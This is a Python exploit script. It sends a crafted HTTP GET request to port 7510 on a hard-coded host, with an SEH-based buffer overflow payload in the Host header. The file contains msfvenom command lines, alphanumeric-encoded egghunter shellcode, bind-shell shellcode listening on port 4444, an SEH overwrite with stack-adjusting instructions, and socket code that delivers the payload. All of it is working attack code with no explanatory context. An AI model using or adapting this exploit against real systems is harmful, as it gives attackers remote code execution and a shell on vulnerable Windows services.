#!/usr/bin/env python

import socket
import struct
from time import sleep

TCP_IP = '192.168.29.240'
TCP_PORT = 7510
#msf-egghunter -f raw -e b00b -v egghunter -p windows -a x86 | msfvenom -p - --platform windows -a x86 -b '\x00\x0a\x0d\x2f\x3a\x3f\x40\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' -f python -e x86/alpha_mixed bufferregister=esp
egghunter =  b""
egghunter += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egghunter += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
egghunter += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
egghunter += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
egghunter += b"\x62\x46\x6e\x61\x59\x5a\x39\x6f\x66\x6f\x77\x32\x62"
egghunter += b"\x72\x31\x7a\x74\x42\x70\x58\x4a\x6d\x36\x4e\x47\x4c"
egghunter += b"\x64\x45\x43\x6a\x63\x44\x78\x6f\x6c\x78\x75\x32\x56"
egghunter += b"\x50\x70\x30\x53\x52\x4e\x69\x79\x47\x4c\x6f\x54\x35"
egghunter += b"\x68\x6a\x4e\x4f\x73\x45\x5a\x47\x4b\x4f\x79\x77\x41"
egghunter += b"\x41"

#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -b '\x00\x0a\x0d\x2f\x3a\x3f\x40\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' -f python -e x86/alpha_mixed bufferregister=edi -v shellcode

shellcode =  b""
shellcode += b"\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
shellcode += b"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
shellcode += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x4b"
shellcode += b"\x58\x4f\x72\x45\x50\x33\x30\x43\x30\x53\x50"
shellcode += b"\x6e\x69\x49\x75\x70\x31\x69\x50\x30\x64\x4e"
shellcode += b"\x6b\x70\x50\x36\x50\x4e\x6b\x36\x32\x46\x6c"
shellcode += b"\x6c\x4b\x51\x42\x57\x64\x6c\x4b\x72\x52\x77"
shellcode += b"\x58\x54\x4f\x6d\x67\x53\x7a\x64\x66\x64\x71"
shellcode += b"\x59\x6f\x6e\x4c\x47\x4c\x73\x51\x43\x4c\x55"
shellcode += b"\x52\x34\x6c\x77\x50\x4f\x31\x4a\x6f\x46\x6d"
shellcode += b"\x56\x61\x59\x57\x48\x62\x78\x72\x32\x72\x51"
shellcode += b"\x47\x4e\x6b\x50\x52\x34\x50\x6e\x6b\x31\x5a"
shellcode += b"\x57\x4c\x4c\x4b\x50\x4c\x44\x51\x74\x38\x39"
shellcode += b"\x73\x30\x48\x47\x71\x48\x51\x70\x51\x4c\x4b"
shellcode += b"\x51\x49\x51\x30\x67\x71\x39\x43\x6e\x6b\x51"
shellcode += b"\x59\x54\x58\x39\x73\x76\x5a\x50\x49\x6e\x6b"
shellcode += b"\x67\x44\x4e\x6b\x57\x71\x58\x56\x50\x31\x49"
shellcode += b"\x6f\x4e\x4c\x69\x51\x68\x4f\x56\x6d\x67\x71"
shellcode += b"\x59\x57\x64\x78\x39\x70\x63\x45\x58\x76\x37"
shellcode += b"\x73\x53\x4d\x38\x78\x55\x6b\x61\x6d\x75\x74"
shellcode += b"\x32\x55\x59\x74\x46\x38\x6c\x4b\x76\x38\x75"
shellcode += b"\x74\x76\x61\x68\x53\x71\x76\x6c\x4b\x34\x4c"
shellcode += b"\x30\x4b\x4e\x6b\x36\x38\x77\x6c\x47\x71\x79"
shellcode += b"\x43\x4c\x4b\x63\x34\x4c\x4b\x36\x61\x7a\x70"
shellcode += b"\x6b\x39\x57\x34\x46\x44\x54\x64\x33\x6b\x71"
shellcode += b"\x4b\x31\x71\x73\x69\x62\x7a\x43\x61\x39\x6f"
shellcode += b"\x39\x70\x61\x4f\x33\x6f\x43\x6a\x4e\x6b\x34"
shellcode += b"\x52\x5a\x4b\x6e\x6d\x61\x4d\x52\x48\x57\x43"
shellcode += b"\x54\x72\x65\x50\x57\x70\x63\x58\x44\x37\x74"
shellcode += b"\x33\x47\x42\x51\x4f\x53\x64\x51\x78\x42\x6c"
shellcode += b"\x52\x57\x57\x56\x63\x37\x49\x6f\x4e\x35\x4f"
shellcode += b"\x48\x4e\x70\x65\x51\x75\x50\x73\x30\x67\x59"
shellcode += b"\x39\x54\x63\x64\x56\x30\x43\x58\x56\x49\x4d"
shellcode += b"\x50\x42\x4b\x53\x30\x49\x6f\x39\x45\x30\x6a"
shellcode += b"\x55\x58\x51\x49\x76\x30\x4d\x32\x49\x6d\x71"
shellcode += b"\x50\x70\x50\x57\x30\x52\x70\x31\x78\x78\x6a"
shellcode += b"\x44\x4f\x39\x4f\x79\x70\x79\x6f\x48\x55\x4e"
shellcode += b"\x77\x30\x68\x77\x72\x53\x30\x72\x31\x51\x4c"
shellcode += b"\x6b\x39\x4b\x56\x42\x4a\x34\x50\x33\x66\x61"
shellcode += b"\x47\x71\x78\x6b\x72\x69\x4b\x30\x37\x42\x47"
shellcode += b"\x4b\x4f\x6a\x75\x33\x67\x51\x78\x4e\x57\x39"
shellcode += b"\x79\x56\x58\x69\x6f\x6b\x4f\x48\x55\x66\x37"
shellcode += b"\x53\x58\x70\x74\x4a\x4c\x47\x4b\x58\x61\x59"
shellcode += b"\x6f\x69\x45\x43\x67\x7a\x37\x70\x68\x73\x45"
shellcode += b"\x52\x4e\x42\x6d\x55\x31\x69\x6f\x4a\x75\x65"
shellcode += b"\x38\x61\x73\x42\x4d\x61\x74\x35\x50\x4b\x39"
shellcode += b"\x4a\x43\x43\x67\x42\x77\x72\x77\x75\x61\x6b"
shellcode += b"\x46\x42\x4a\x52\x32\x70\x59\x46\x36\x59\x72"
shellcode += b"\x79\x6d\x50\x66\x79\x57\x77\x34\x44\x64\x55"
shellcode += b"\x6c\x66\x61\x56\x61\x4c\x4d\x42\x64\x77\x54"
shellcode += b"\x72\x30\x38\x46\x77\x70\x32\x64\x50\x54\x46"
shellcode += b"\x30\x53\x66\x50\x56\x70\x56\x31\x56\x66\x36"
shellcode += b"\x70\x4e\x31\x46\x73\x66\x73\x63\x71\x46\x32"
shellcode += b"\x48\x32\x59\x78\x4c\x55\x6f\x6e\x66\x59\x6f"
shellcode += b"\x5a\x75\x6e\x69\x79\x70\x70\x4e\x53\x66\x62"
shellcode += b"\x66\x59\x6f\x50\x30\x61\x78\x44\x48\x6f\x77"
shellcode += b"\x35\x4d\x45\x30\x69\x6f\x4b\x65\x4f\x4b\x6a"
shellcode += b"\x50\x68\x35\x6e\x42\x63\x66\x45\x38\x79\x36"
shellcode += b"\x7a\x35\x4d\x6d\x6d\x4d\x6b\x4f\x4a\x75\x77"
shellcode += b"\x4c\x57\x76\x71\x6c\x56\x6a\x6f\x70\x39\x6b"
shellcode += b"\x6b\x50\x70\x75\x74\x45\x6f\x4b\x37\x37\x74"
shellcode += b"\x53\x70\x72\x52\x4f\x42\x4a\x67\x70\x51\x43"
shellcode += b"\x6b\x4f\x6e\x35\x41\x41"


payload = "A" * 5 + "b00bb00b" + shellcode
payload += "A" * (3305 - len(payload))
payload += "\x77\x0b\x76\x09" # nseh
payload += struct.pack("<I",0x6d695864)
payload += "B" * 14
payload += "\x54\x58" # Push ESP onto the stack and Pop that value into EAX
payload += "\x66\x05\x3c\x15" # Add AX,0x153C
payload += "\x50\x5c" # Push EAX onto the stack and pop that value into ESP
payload += "C" * 2
payload += egghunter
payload += "C" * (3930 - len(payload))


buf= "GET /topology/home HTTP/1.1\r\n"
buf+= "Host: " + payload + "\r\n"
buf+= "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
buf+= "Referer: http://192.168.153.133:7510/\r\n\r\n"
	
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(buf)
s.close()